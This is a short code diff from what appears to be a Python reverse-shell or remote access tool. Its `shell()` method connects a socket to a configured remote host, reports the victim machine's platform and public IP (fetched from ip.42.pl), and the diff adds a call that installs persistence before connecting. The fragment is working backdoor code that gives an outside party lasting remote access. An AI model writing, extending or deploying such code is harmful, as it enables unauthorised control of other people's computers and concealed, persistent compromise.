@@ -34,6 +34,7 @@ class functions(object):
     def shell(self):
         try:
             self.running = True
+            self.persistence.doFirstPersistence()
             soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             soc.connect((self.host, self.port))
             soc.send("Conected to " + platform.platform() + " with ip " + urlopen('http://ip.42.pl/raw').read() + "\n")
